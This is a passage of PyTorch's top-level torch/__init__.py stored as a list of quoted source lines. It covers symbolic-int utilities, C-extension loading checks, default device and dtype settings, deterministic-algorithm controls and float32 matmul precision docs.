      "    if isinstance(a, (SymInt, SymFloat)):\n",
      "        return a.__sym_max__(b)\n",
      "    elif isinstance(b, (SymInt, SymFloat)):\n",
      "        # Due to promotion semantics, this is operator is commutative:\n",
      "        # max(1, 1.0) === max(1.0, 1) === 1.0\n",
      "        return b.__sym_max__(a)\n",
      "    # TODO: Probably can make bool work too, just lazy\n",
      "\n",
      "    all_types, float_types = __all_and_float_types()\n",
      "\n",
      "    assert isinstance(a, all_types), type(a)\n",
      "    assert isinstance(b, all_types), type(b)\n",
      "    if isinstance(a, float_types) or isinstance(b, float_types):\n",
      "        return builtins.float(builtins.max(a, b))\n",
      "    else:\n",
      "        return builtins.max(a, b)\n",
      "\n",
      "\n",
      "def __all_and_float_types() -> _Tuple[_Tuple[_Type, ...], _Tuple[_Type, ...]]:\n",
      "    try:\n",
      "        import numpy as np\n",
      "\n",
      "        all_types: _Tuple[_Type, ...] = (\n",
      "            np.integer,\n",
      "            np.floating,\n",
      "            builtins.int,\n",
      "            builtins.float,\n",
      "        )\n",
      "        float_types: _Tuple[_Type, ...] = (np.floating, builtins.float)\n",
      "    except ModuleNotFoundError:\n",
      "        all_types = (builtins.int, builtins.float)\n",
      "        float_types = (builtins.float,)\n",
      "\n",
      "    return all_types, float_types\n",
      "\n",
      "\n",
      "def sym_min(a, b):\n",
      "    \"\"\"SymInt-aware utility for min().\"\"\"\n",
      "    if overrides.has_torch_function((a, b)):\n",
      "        return overrides.handle_torch_function(sym_min, (a, b), a, b)\n",
      "    if isinstance(a, (SymInt, SymFloat)):\n",
      "        return a.__sym_min__(b)\n",
      "    elif isinstance(b, (SymInt, SymFloat)):\n",
      "        return b.__sym_min__(a)\n",
      "\n",
      "    all_types, float_types = __all_and_float_types()\n",
      "\n",
      "    assert isinstance(a, all_types), type(a)\n",
      "    assert isinstance(b, all_types), type(b)\n",
      "    if isinstance(a, float_types) or isinstance(b, float_types):\n",
      "        return builtins.float(builtins.min(a, b))\n",
      "    else:\n",
      "        return builtins.min(a, b)\n",
      "\n",
      "\n",
      "def sym_sum(args):\n",
      "    \"\"\"\n",
      "    N-ary add which is faster to compute for long lists than iterated binary\n",
      "    addition.  Only does something special for integers.\n",
      "    \"\"\"\n",
      "    if overrides.has_torch_function(args):\n",
      "        return overrides.handle_torch_function(sym_sum, args, args)\n",
      "\n",
      "    found = None\n",
      "    for a in args:\n",
      "        if not isinstance(a, (SymInt, builtins.int)):\n",
      "            return builtins.sum(args)\n",
      "        if isinstance(a, SymInt):\n",
      "            found = a.node\n",
      "    if found is None:\n",
      "        return builtins.sum(args)\n",
      "\n",
      "    from torch.fx.experimental.sym_node import to_node, wrap_node\n",
      "\n",
      "    return wrap_node(found.sym_sum(tuple(to_node(found, a) for a in args)))\n",
      "\n",
      "\n",
      "# Drop in replacement for math.sqrt, math.sin, math.cos etc\n",
      "def _get_sym_math_fn(name):\n",
      "    def fn(a):\n",
      "        if overrides.has_torch_function_unary(a):\n",
      "            return overrides.handle_torch_function(fn, (a,), a)\n",
      "        if isinstance(a, SymInt):\n",
      "            a = torch.sym_float(a)\n",
      "        if hasattr(a, f\"__sym_{name}__\"):\n",
      "            return getattr(a, f\"__sym_{name}__\")()\n",
      "        return getattr(math, name)(a)\n",
      "\n",
      "    return fn\n",
      "\n",
      "\n",
      "__fn, __name, __sym_name = None, \"\", \"\"\n",
      "for __name in (\n",
      "    \"sqrt\",\n",
      "    \"cos\",\n",
      "    \"cosh\",\n",
      "    \"sin\",\n",
      "    \"sinh\",\n",
      "    \"tan\",\n",
      "    \"tanh\",\n",
      "    \"asin\",\n",
      "    \"acos\",\n",
      "    \"atan\",\n",
      "    \"log2\",\n",
      "):\n",
      "    __sym_name = f\"_sym_{__name}\"\n",
      "    __fn = _get_sym_math_fn(__name)\n",
      "    __fn.__qualname__ = __fn.__name__ = __sym_name\n",
      "    globals()[__sym_name] = __fn\n",
      "\n",
      "\n",
      "del __fn, __name, __sym_name, _get_sym_math_fn\n",
      "\n",
      "# Adding temporary shortcut\n",
      "sym_sqrt = globals()[\"_sym_sqrt\"]\n",
      "__all__.append(\"sym_sqrt\")\n",
      "\n",
      "\n",
      "def sym_ite(b, t, f):\n",
      "    if overrides.has_torch_function((b, t, f)):\n",
      "        return overrides.handle_torch_function(sym_ite, (b, t, f), b, t, f)\n",
      "    assert isinstance(b, (SymBool, builtins.bool)) and type(t) == type(f)\n",
      "    if isinstance(b, SymBool):\n",
      "        return b.__sym_ite__(t, f)\n",
      "    return t if b else f\n",
      "\n",
      "\n",
      "# Create a fresh unbacked int, from an (possibly unbacked int) expression.\n",
      "def sym_fresh_size(expr):\n",
      "    return torch.tensor(expr).item()\n",
      "\n",
      "\n",
      "# Check to see if we can load C extensions, and if not provide some guidance\n",
      "# on what the problem might be.\n",
      "try:\n",
      "    # _initExtension is chosen (arbitrarily) as a sentinel.\n",
      "    from torch._C import _initExtension\n",
      "except ImportError:\n",
      "    import torch._C as _C_for_compiled_check\n",
      "\n",
      "    # The __file__ check only works for Python 3.7 and above.\n",
      "    if _C_for_compiled_check.__file__ is None:\n",
      "        raise ImportError(\n",
      "            textwrap.dedent(\n",
      "                \"\"\"\n",
      "                Failed to load PyTorch C extensions:\n",
      "                    It appears that PyTorch has loaded the `torch/_C` folder\n",
      "                    of the PyTorch repository rather than the C extensions which\n",
      "                    are expected in the `torch._C` namespace. This can occur when\n",
      "                    using the `install` workflow. e.g.\n",
      "                        $ python setup.py install && python -c \"import torch\"\n",
      "\n",
      "                    This error can generally be solved using the `develop` workflow\n",
      "                        $ python setup.py develop && python -c \"import torch\"  # This should succeed\n",
      "                    or by running Python from a different directory.\n",
      "                \"\"\"\n",
      "            ).strip()\n",
      "        ) from None\n",
      "    raise  # If __file__ is not None the cause is unknown, so just re-raise.\n",
      "\n",
      "# The torch._C submodule is already loaded via `from torch._C import *` above\n",
      "# Make an explicit reference to the _C submodule to appease linters\n",
      "from torch import _C as _C\n",
      "\n",
      "\n",
      "__name, __obj = \"\", None\n",
      "for __name in dir(_C):\n",
      "    if __name[0] != \"_\" and not __name.endswith(\"Base\"):\n",
      "        __all__.append(__name)\n",
      "        __obj = getattr(_C, __name)\n",
      "        if callable(__obj) or inspect.isclass(__obj):\n",
      "            if __obj.__module__ != __name__:  # \"torch\"\n",
      "                # TODO: fix their module from C++ side\n",
      "                if __name not in {\n",
      "                    \"DisableTorchFunctionSubclass\",\n",
      "                    \"DisableTorchFunction\",\n",
      "                    \"Generator\",\n",
      "                }:\n",
      "                    __obj.__module__ = __name__  # \"torch\"\n",
      "    elif __name == \"TensorBase\":\n",
      "        # issue 109438 / pr 109940. Prevent TensorBase from being copied into torch.\n",
      "        delattr(sys.modules[__name__], __name)\n",
      "\n",
      "del __name, __obj\n",
      "\n",
      "if not TYPE_CHECKING:\n",
      "    # issue 38137 and python issue 43367. Submodules of a C extension are\n",
      "    # non-standard, and attributes of those submodules cannot be pickled since\n",
      "    # pickle expect to be able to import them as \"from _C.sub import attr\"\n",
      "    # which fails with \"_C is not a package\n",
      "    def _import_extension_to_sys_modules(module, memo=None):\n",
      "        if memo is None:\n",
      "            memo = set()\n",
      "        if module in memo:\n",
      "            return\n",
      "        memo.add(module)\n",
      "        module_name = module.__name__\n",
      "        for name in dir(module):\n",
      "            member = getattr(module, name)\n",
      "            member_name = getattr(member, \"__name__\", \"\")\n",
      "            if inspect.ismodule(member) and member_name.startswith(module_name):\n",
      "                sys.modules.setdefault(member_name, member)\n",
      "                # Recurse for submodules (e.g., `_C._dynamo.eval_frame`)\n",
      "                _import_extension_to_sys_modules(member, memo)\n",
      "\n",
      "    _import_extension_to_sys_modules(_C)\n",
      "    del _import_extension_to_sys_modules\n",
      "\n",
      "################################################################################\n",
      "# Define basic utilities\n",
      "################################################################################\n",
      "\n",
      "\n",
      "def typename(obj: _Any, /) -> str:\n",
      "    \"\"\"\n",
      "    String representation of the type of an object.\n",
      "\n",
      "    This function returns a fully qualified string representation of an object's type.\n",
      "    Args:\n",
      "        obj (object): The object whose type to represent\n",
      "    Returns:\n",
      "        str: the type of the object `o`\n",
      "    Example:\n",
      "        >>> x = torch.tensor([1, 2, 3])\n",
      "        >>> torch.typename(x)\n",
      "        'torch.LongTensor'\n",
      "        >>> torch.typename(torch.nn.Parameter)\n",
      "        'torch.nn.parameter.Parameter'\n",
      "    \"\"\"\n",
      "    if isinstance(obj, torch.Tensor):\n",
      "        return obj.type()\n",
      "\n",
      "    module = getattr(obj, \"__module__\", \"\") or \"\"\n",
      "    qualname = \"\"\n",
      "\n",
      "    if hasattr(obj, \"__qualname__\"):\n",
      "        qualname = obj.__qualname__\n",
      "    elif hasattr(obj, \"__name__\"):\n",
      "        qualname = obj.__name__\n",
      "    else:\n",
      "        module = obj.__class__.__module__ or \"\"\n",
      "        qualname = obj.__class__.__qualname__\n",
      "\n",
      "    if module in {\"\", \"builtins\"}:\n",
      "        return qualname\n",
      "    return f\"{module}.{qualname}\"\n",
      "\n",
      "\n",
      "def is_tensor(obj: _Any, /) -> _TypeIs[\"torch.Tensor\"]:\n",
      "    r\"\"\"Returns True if `obj` is a PyTorch tensor.\n",
      "\n",
      "    Note that this function is simply doing ``isinstance(obj, Tensor)``.\n",
      "    Using that ``isinstance`` check is better for typechecking with mypy,\n",
      "    and more explicit - so it's recommended to use that instead of\n",
      "    ``is_tensor``.\n",
      "\n",
      "    Args:\n",
      "        obj (object): Object to test\n",
      "    Example::\n",
      "\n",
      "        >>> x = torch.tensor([1, 2, 3])\n",
      "        >>> torch.is_tensor(x)\n",
      "        True\n",
      "\n",
      "    \"\"\"\n",
      "    return isinstance(obj, torch.Tensor)\n",
      "\n",
      "\n",
      "def is_storage(obj: _Any, /) -> _TypeIs[_Union[\"TypedStorage\", \"UntypedStorage\"]]:\n",
      "    r\"\"\"Returns True if `obj` is a PyTorch storage object.\n",
      "\n",
      "    Args:\n",
      "        obj (Object): Object to test\n",
      "    \"\"\"\n",
      "    return type(obj) in _storage_classes\n",
      "\n",
      "\n",
      "_GLOBAL_DEVICE_CONTEXT = threading.local()\n",
      "\n",
      "\n",
      "def get_default_device() -> \"torch.device\":\n",
      "    r\"\"\"Gets the default ``torch.Tensor`` to be allocated on ``device``\"\"\"\n",
      "    global _GLOBAL_DEVICE_CONTEXT\n",
      "\n",
      "    if hasattr(_GLOBAL_DEVICE_CONTEXT, \"device_context\"):\n",
      "        device = _GLOBAL_DEVICE_CONTEXT.device_context.device\n",
      "        if device.index is not None:\n",
      "            return device\n",
      "        else:\n",
      "            # TODO: Call like get_device_index() method corresponding to\n",
      "            # each device type\n",
      "            return torch.tensor([]).device\n",
      "    else:\n",
      "        return torch.device(\"cpu\")\n",
      "\n",
      "\n",
      "def set_default_device(\n",
      "    device: _Optional[_Union[\"torch.device\", str, builtins.int]],\n",
      ") -> None:\n",
      "    \"\"\"Sets the default ``torch.Tensor`` to be allocated on ``device``.  This\n",
      "    does not affect factory function calls which are called with an explicit\n",
      "    ``device`` argument.  Factory calls will be performed as if they\n",
      "    were passed ``device`` as an argument.\n",
      "\n",
      "    To only temporarily change the default device instead of setting it\n",
      "    globally, use ``with torch.device(device):`` instead.\n",
      "\n",
      "    The default device is initially ``cpu``.  If you set the default tensor\n",
      "    device to another device (e.g., ``cuda``) without a device index, tensors\n",
      "    will be allocated on whatever the current device for the device type,\n",
      "    even after :func:`torch.cuda.set_device` is called.\n",
      "\n",
      "    .. warning::\n",
      "\n",
      "        This function imposes a slight performance cost on every Python\n",
      "        call to the torch API (not just factory functions).  If this\n",
      "        is causing problems for you, please comment on\n",
      "        https://github.com/pytorch/pytorch/issues/92701\n",
      "\n",
      "    .. note::\n",
      "\n",
      "        This doesn't affect functions that create tensors that share the same memory as the input, like:\n",
      "        :func:`torch.from_numpy` and :func:`torch.frombuffer`\n",
      "\n",
      "    Args:\n",
      "        device (device or string): the device to set as default\n",
      "\n",
      "    Example::\n",
      "\n",
      "        >>> # xdoctest: +SKIP(\"requires cuda, changes global state\")\n",
      "        >>> torch.get_default_device()\n",
      "        device(type='cpu')\n",
      "        >>> torch.set_default_device('cuda')  # current device is 0\n",
      "        >>> torch.get_default_device()\n",
      "        device(type='cuda', index=0)\n",
      "        >>> torch.set_default_device('cuda')\n",
      "        >>> torch.cuda.set_device('cuda:1')  # current device is 1\n",
      "        >>> torch.get_default_device()\n",
      "        device(type='cuda', index=1)\n",
      "        >>> torch.set_default_device('cuda:1')\n",
      "        >>> torch.get_default_device()\n",
      "        device(type='cuda', index=1)\n",
      "\n",
      "    \"\"\"\n",
      "    global _GLOBAL_DEVICE_CONTEXT\n",
      "    if hasattr(_GLOBAL_DEVICE_CONTEXT, \"device_context\"):\n",
      "        device_context = _GLOBAL_DEVICE_CONTEXT.device_context\n",
      "        if device_context is not None:\n",
      "            device_context.__exit__(None, None, None)\n",
      "\n",
      "    if device is None:\n",
      "        device_context = None\n",
      "    else:\n",
      "        from torch.utils._device import DeviceContext\n",
      "\n",
      "        device_context = DeviceContext(device)\n",
      "        device_context.__enter__()\n",
      "    _GLOBAL_DEVICE_CONTEXT.device_context = device_context\n",
      "\n",
      "\n",
      "def set_default_tensor_type(t: _Union[_Type[\"torch.Tensor\"], str], /) -> None:\n",
      "    r\"\"\"\n",
      "    .. warning::\n",
      "\n",
      "        This function is deprecated as of PyTorch 2.1, please use :func:`torch.set_default_dtype()` and\n",
      "        :func:`torch.set_default_device()` as alternatives.\n",
      "\n",
      "    Sets the default ``torch.Tensor`` type to floating point tensor type\n",
      "    ``t``. This type will also be used as default floating point type for\n",
      "    type inference in :func:`torch.tensor`.\n",
      "\n",
      "    The default floating point tensor type is initially ``torch.FloatTensor``.\n",
      "\n",
      "    Args:\n",
      "        t (type or string): the floating point tensor type or its name\n",
      "\n",
      "    Example::\n",
      "\n",
      "        >>> # xdoctest: +SKIP(\"Other tests may have changed the default type. Can we reset it?\")\n",
      "        >>> torch.tensor([1.2, 3]).dtype    # initial default for floating point is torch.float32\n",
      "        torch.float32\n",
      "        >>> torch.set_default_tensor_type(torch.DoubleTensor)\n",
      "        >>> torch.tensor([1.2, 3]).dtype    # a new floating point tensor\n",
      "        torch.float64\n",
      "\n",
      "    \"\"\"\n",
      "    if isinstance(t, str):\n",
      "        t = _import_dotted_name(t)\n",
      "    _C._set_default_tensor_type(t)\n",
      "\n",
      "\n",
      "def set_default_dtype(d: \"torch.dtype\", /) -> None:\n",
      "    r\"\"\"\n",
      "\n",
      "    Sets the default floating point dtype to :attr:`d`. Supports floating point dtype\n",
      "    as inputs. Other dtypes will cause torch to raise an exception.\n",
      "\n",
      "    When PyTorch is initialized its default floating point dtype is torch.float32,\n",
      "    and the intent of set_default_dtype(torch.float64) is to facilitate NumPy-like\n",
      "    type inference. The default floating point dtype is used to:\n",
      "\n",
      "    1. Implicitly determine the default complex dtype. When the default floating type is float16,\n",
      "       the default complex dtype is complex32. For float32, the default complex dtype is complex64.\n",
      "       For float64, it is complex128. For bfloat16, an exception will be raised because\n",
      "       there is no corresponding complex type for bfloat16.\n",
      "    2. Infer the dtype for tensors constructed using Python floats or complex Python\n",
      "       numbers. See examples below.\n",
      "    3. Determine the result of type promotion between bool and integer tensors and\n",
      "       Python floats and complex Python numbers.\n",
      "\n",
      "    Args:\n",
      "        d (:class:`torch.dtype`): the floating point dtype to make the default.\n",
      "\n",
      "    Example:\n",
      "        >>> # xdoctest: +SKIP(\"Other tests may have changed the default type. Can we reset it?\")\n",
      "        >>> # initial default for floating point is torch.float32\n",
      "        >>> # Python floats are interpreted as float32\n",
      "        >>> torch.tensor([1.2, 3]).dtype\n",
      "        torch.float32\n",
      "        >>> # initial default for floating point is torch.complex64\n",
      "        >>> # Complex Python numbers are interpreted as complex64\n",
      "        >>> torch.tensor([1.2, 3j]).dtype\n",
      "        torch.complex64\n",
      "\n",
      "        >>> torch.set_default_dtype(torch.float64)\n",
      "        >>> # Python floats are now interpreted as float64\n",
      "        >>> torch.tensor([1.2, 3]).dtype  # a new floating point tensor\n",
      "        torch.float64\n",
      "        >>> # Complex Python numbers are now interpreted as complex128\n",
      "        >>> torch.tensor([1.2, 3j]).dtype  # a new complex tensor\n",
      "        torch.complex128\n",
      "\n",
      "        >>> torch.set_default_dtype(torch.float16)\n",
      "        >>> # Python floats are now interpreted as float16\n",
      "        >>> torch.tensor([1.2, 3]).dtype  # a new floating point tensor\n",
      "        torch.float16\n",
      "        >>> # Complex Python numbers are now interpreted as complex128\n",
      "        >>> torch.tensor([1.2, 3j]).dtype  # a new complex tensor\n",
      "        torch.complex32\n",
      "\n",
      "    \"\"\"\n",
      "    _C._set_default_dtype(d)\n",
      "\n",
      "\n",
      "def use_deterministic_algorithms(\n",
      "    mode: builtins.bool,\n",
      "    *,\n",
      "    warn_only: builtins.bool = False,\n",
      ") -> None:\n",
      "    r\"\"\"Sets whether PyTorch operations must use \"deterministic\"\n",
      "    algorithms. That is, algorithms which, given the same input, and when\n",
      "    run on the same software and hardware, always produce the same output.\n",
      "    When enabled, operations will use deterministic algorithms when available,\n",
      "    and if only nondeterministic algorithms are available they will throw a\n",
      "    :class:`RuntimeError` when called.\n",
      "\n",
      "    .. note:: This setting alone is not always enough to make an application\n",
      "        reproducible. Refer to :ref:`reproducibility` for more information.\n",
      "\n",
      "    .. note:: :func:`torch.set_deterministic_debug_mode` offers an alternative\n",
      "        interface for this feature.\n",
      "\n",
      "    The following normally-nondeterministic operations will act\n",
      "    deterministically when ``mode=True``:\n",
      "\n",
      "        * :class:`torch.nn.Conv1d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.Conv2d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.Conv3d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.ConvTranspose1d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.ConvTranspose2d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.ConvTranspose3d` when called on CUDA tensor\n",
      "        * :class:`torch.nn.ReplicationPad2d` when attempting to differentiate a CUDA tensor\n",
      "        * :func:`torch.bmm` when called on sparse-dense CUDA tensors\n",
      "        * :func:`torch.Tensor.__getitem__` when attempting to differentiate a CPU tensor\n",
      "          and the index is a list of tensors\n",
      "        * :func:`torch.Tensor.index_put` with ``accumulate=False``\n",
      "        * :func:`torch.Tensor.index_put` with ``accumulate=True`` when called on a CPU\n",
      "          tensor\n",
      "        * :func:`torch.Tensor.put_` with ``accumulate=True`` when called on a CPU\n",
      "          tensor\n",
      "        * :func:`torch.Tensor.scatter_add_` when called on a CUDA tensor\n",
      "        * :func:`torch.gather` when called on a CUDA tensor that requires grad\n",
      "        * :func:`torch.index_add` when called on CUDA tensor\n",
      "        * :func:`torch.index_select` when attempting to differentiate a CUDA tensor\n",
      "        * :func:`torch.repeat_interleave` when attempting to differentiate a CUDA tensor\n",
      "        * :func:`torch.Tensor.index_copy` when called on a CPU or CUDA tensor\n",
      "        * :func:`torch.Tensor.scatter` when `src` type is Tensor and called on CUDA tensor\n",
      "        * :func:`torch.Tensor.scatter_reduce` when ``reduce='sum'`` or ``reduce='mean'`` and called on CUDA tensor\n",
      "\n",
      "    The following normally-nondeterministic operations will throw a\n",
      "    :class:`RuntimeError` when ``mode=True``:\n",
      "\n",
      "        * :class:`torch.nn.AvgPool3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.AdaptiveAvgPool2d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.AdaptiveAvgPool3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.MaxPool3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.AdaptiveMaxPool2d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.FractionalMaxPool2d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.FractionalMaxPool3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.MaxUnpool1d`\n",
      "        * :class:`torch.nn.MaxUnpool2d`\n",
      "        * :class:`torch.nn.MaxUnpool3d`\n",
      "        * :func:`torch.nn.functional.interpolate` when attempting to differentiate a CUDA tensor\n",
      "          and one of the following modes is used:\n",
      "\n",
      "          - ``linear``\n",
      "          - ``bilinear``\n",
      "          - ``bicubic``\n",
      "          - ``trilinear``\n",
      "\n",
      "        * :class:`torch.nn.ReflectionPad1d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.ReflectionPad2d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.ReflectionPad3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.ReplicationPad1d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.ReplicationPad3d` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.NLLLoss` when called on a CUDA tensor\n",
      "        * :class:`torch.nn.CTCLoss` when attempting to differentiate a CUDA tensor\n",
      "        * :class:`torch.nn.EmbeddingBag` when attempting to differentiate a CUDA tensor when\n",
      "          ``mode='max'``\n",
      "        * :func:`torch.Tensor.put_` when ``accumulate=False``\n",
      "        * :func:`torch.Tensor.put_` when ``accumulate=True`` and called on a CUDA tensor\n",
      "        * :func:`torch.histc` when called on a CUDA tensor\n",
      "        * :func:`torch.bincount` when called on a CUDA tensor and ``weights``\n",
      "          tensor is given\n",
      "        * :func:`torch.kthvalue` with called on a CUDA tensor\n",
      "        * :func:`torch.median` with indices output when called on a CUDA tensor\n",
      "        * :func:`torch.nn.functional.grid_sample` when attempting to differentiate a CUDA tensor\n",
      "        * :func:`torch.cumsum` when called on a CUDA tensor when dtype is floating point or complex\n",
      "        * :func:`torch.Tensor.scatter_reduce` when ``reduce='prod'`` and called on CUDA tensor\n",
      "        * :func:`torch.Tensor.resize_` when called with a quantized tensor\n",
      "\n",
      "    In addition, several operations fill uninitialized memory when this setting\n",
      "    is turned on and when\n",
      "    :attr:`torch.utils.deterministic.fill_uninitialized_memory` is turned on.\n",
      "    See the documentation for that attribute for more information.\n",
      "\n",
      "    A handful of CUDA operations are nondeterministic if the CUDA version is\n",
      "    10.2 or greater, unless the environment variable ``CUBLAS_WORKSPACE_CONFIG=:4096:8``\n",
      "    or ``CUBLAS_WORKSPACE_CONFIG=:16:8`` is set. See the CUDA documentation for more\n",
      "    details: `<https://docs.nvidia.com/cuda/cublas/index.html#results-reproducibility>`_\n",
      "    If one of these environment variable configurations is not set, a :class:`RuntimeError`\n",
      "    will be raised from these operations when called with CUDA tensors:\n",
      "\n",
      "        * :func:`torch.mm`\n",
      "        * :func:`torch.mv`\n",
      "        * :func:`torch.bmm`\n",
      "\n",
      "    Note that deterministic operations tend to have worse performance than\n",
      "    nondeterministic operations.\n",
      "\n",
      "    .. note::\n",
      "\n",
      "        This flag does not detect or prevent nondeterministic behavior caused\n",
      "        by calling an inplace operation on a tensor with an internal memory\n",
      "        overlap or by giving such a tensor as the :attr:`out` argument for an\n",
      "        operation. In these cases, multiple writes of different data may target\n",
      "        a single memory location, and the order of writes is not guaranteed.\n",
      "\n",
      "    Args:\n",
      "        mode (:class:`bool`): If True, makes potentially nondeterministic\n",
      "            operations switch to a deterministic algorithm or throw a runtime\n",
      "            error. If False, allows nondeterministic operations.\n",
      "\n",
      "    Keyword args:\n",
      "        warn_only (:class:`bool`, optional): If True, operations that do not\n",
      "            have a deterministic implementation will throw a warning instead of\n",
      "            an error. Default: ``False``\n",
      "\n",
      "    Example::\n",
      "\n",
      "        >>> # xdoctest: +SKIP\n",
      "        >>> torch.use_deterministic_algorithms(True)\n",
      "\n",
      "        # Forward mode nondeterministic error\n",
      "        >>> torch.randn(10, device='cuda').kthvalue(1)\n",
      "        ...\n",
      "        RuntimeError: kthvalue CUDA does not have a deterministic implementation...\n",
      "\n",
      "        # Backward mode nondeterministic error\n",
      "        >>> torch.nn.AvgPool3d(1)(torch.randn(3, 4, 5, 6, requires_grad=True).cuda()).sum().backward()\n",
      "        ...\n",
      "        RuntimeError: avg_pool3d_backward_cuda does not have a deterministic implementation...\n",
      "    \"\"\"\n",
      "    _C._set_deterministic_algorithms(mode, warn_only=warn_only)\n",
      "\n",
      "\n",
      "def are_deterministic_algorithms_enabled() -> builtins.bool:\n",
      "    r\"\"\"Returns True if the global deterministic flag is turned on. Refer to\n",
      "    :func:`torch.use_deterministic_algorithms` documentation for more details.\n",
      "    \"\"\"\n",
      "    return _C._get_deterministic_algorithms()\n",
      "\n",
      "\n",
      "def is_deterministic_algorithms_warn_only_enabled() -> builtins.bool:\n",
      "    r\"\"\"Returns True if the global deterministic flag is set to warn only.\n",
      "    Refer to :func:`torch.use_deterministic_algorithms` documentation for more\n",
      "    details.\n",
      "    \"\"\"\n",
      "    return _C._get_deterministic_algorithms_warn_only()\n",
      "\n",
      "\n",
      "def set_deterministic_debug_mode(debug_mode: _Union[builtins.int, str]) -> None:\n",
      "    r\"\"\"Sets the debug mode for deterministic operations.\n",
      "\n",
      "    .. note:: This is an alternative interface for\n",
      "        :func:`torch.use_deterministic_algorithms`. Refer to that function's\n",
      "        documentation for details about affected operations.\n",
      "\n",
      "    Args:\n",
      "        debug_mode(str or int): If \"default\" or 0, don't error or warn on\n",
      "            nondeterministic operations. If \"warn\" or 1, warn on\n",
      "            nondeterministic operations. If \"error\" or 2, error on\n",
      "            nondeterministic operations.\n",
      "    \"\"\"\n",
      "\n",
      "    # NOTE: builtins.int is used here because int in this scope resolves\n",
      "    # to torch.int\n",
      "    if not isinstance(debug_mode, (builtins.int, str)):\n",
      "        raise TypeError(f\"debug_mode must be str or int, but got {type(debug_mode)}\")\n",
      "\n",
      "    if isinstance(debug_mode, str):\n",
      "        if debug_mode == \"default\":\n",
      "            debug_mode = 0\n",
      "        elif debug_mode == \"warn\":\n",
      "            debug_mode = 1\n",
      "        elif debug_mode == \"error\":\n",
      "            debug_mode = 2\n",
      "        else:\n",
      "            raise RuntimeError(\n",
      "                \"invalid value of debug_mode, expected one of `default`, \"\n",
      "                f\"`warn`, `error`, but got {debug_mode}\"\n",
      "            )\n",
      "\n",
      "    if debug_mode == 0:\n",
      "        _C._set_deterministic_algorithms(False)\n",
      "    elif debug_mode == 1:\n",
      "        _C._set_deterministic_algorithms(True, warn_only=True)\n",
      "    elif debug_mode == 2:\n",
      "        _C._set_deterministic_algorithms(True)\n",
      "    else:\n",
      "        raise RuntimeError(\n",
      "            \"invalid value of debug_mode, expected 0, 1, or 2, \" f\"but got {debug_mode}\"\n",
      "        )\n",
      "\n",
      "\n",
      "def get_deterministic_debug_mode() -> builtins.int:\n",
      "    r\"\"\"Returns the current value of the debug mode for deterministic\n",
      "    operations. Refer to :func:`torch.set_deterministic_debug_mode`\n",
      "    documentation for more details.\n",
      "    \"\"\"\n",
      "\n",
      "    if _C._get_deterministic_algorithms():\n",
      "        if _C._get_deterministic_algorithms_warn_only():\n",
      "            return 1\n",
      "        else:\n",
      "            return 2\n",
      "    else:\n",
      "        return 0\n",
      "\n",
      "\n",
      "def get_float32_matmul_precision() -> str:\n",
      "    r\"\"\"Returns the current value of float32 matrix multiplication precision. Refer to\n",
      "    :func:`torch.set_float32_matmul_precision` documentation for more details.\n",
      "    \"\"\"\n",
      "    return _C._get_float32_matmul_precision()\n",
      "\n",
      "\n",
      "def set_float32_matmul_precision(precision: str) -> None:\n",
      "    r\"\"\"Sets the internal precision of float32 matrix multiplications.\n",
      "\n",
      "    Running float32 matrix multiplications in lower precision may significantly increase\n",
      "    performance, and in some programs the loss of precision has a negligible impact.\n",
      "\n",
      "    Supports three settings:\n",
      "\n",
      "        * \"highest\", float32 matrix multiplications use the float32 datatype (24 mantissa\n",
      "          bits with 23 bits explicitly stored) for internal computations.\n",
      "        * \"high\", float32 matrix multiplications either use the TensorFloat32 datatype (10\n",
      "          mantissa bits explicitly stored) or treat each float32 number as the sum of two bfloat16 numbers\n",
      "          (approximately 16 mantissa bits with 14 bits explicitly stored), if the appropriate fast matrix multiplication\n",
      "          algorithms are available.  Otherwise float32 matrix multiplications are computed\n",
      "          as if the precision is \"highest\".  See below for more information on the bfloat16\n",
      "          approach.\n",
      "        * \"medium\", float32 matrix multiplications use the bfloat16 datatype (8 mantissa\n",
      "          bits with 7 bits explicitly stored) for internal computations, if a fast matrix multiplication algorithm\n",
      "          using that datatype internally is available. Otherwise float32\n",
      "          matrix multiplications are computed as if the precision is \"high\".\n",
      "\n",
      "    When using \"high\" precision, float32 multiplications may use a bfloat16-based algorithm\n",
      "    that is more complicated than simply truncating to some smaller number mantissa bits\n",
      "    (e.g. 10 for TensorFloat32, 7 for bfloat16 explicitly stored).  Refer to [Henry2019]_ for a complete\n",
      "    description of this algorithm.  To briefly explain here, the first step is to realize\n",
      "    that we can perfectly encode a single float32 number as the sum of three bfloat16\n",
      "    numbers (because float32 has 23 mantissa bits while bfloat16 has 7 explicitly stored, and both have the\n",
      "    same number of exponent bits).  This means that the product of two float32 numbers can\n",
      "    be exactly given by the sum of nine products of bfloat16 numbers.  We can then trade\n",
      "    accuracy for speed by dropping some of these products.  The \"high\" precision algorithm\n",
      "    specifically keeps only the three most significant products, which conveniently excludes\n",
      "    all of the products involving the last 8 mantissa bits of either input.  This means that\n",
      "    we can represent our inputs as the sum of two bfloat16 numbers rather than three.\n",
      "    Because bfloat16 fused-multiply-add (FMA) instructions are typically >10x faster than\n",
      "    float32 ones, it's faster to do three multiplications and 2 additions with bfloat16\n",
      "    precision than it is to do a single multiplication with float32 precision.\n",
      "\n",
      "    .. [Henry2019] http://arxiv.org/abs/1904.06376\n",
      "\n",
      "    .. note::\n",
      "\n",
      "        This does not change the output dtype of float32 matrix multiplications,\n",
      "        it controls how the internal computation of the matrix multiplication is performed.\n",
      "\n",
      "    .. note::\n",
      "\n",
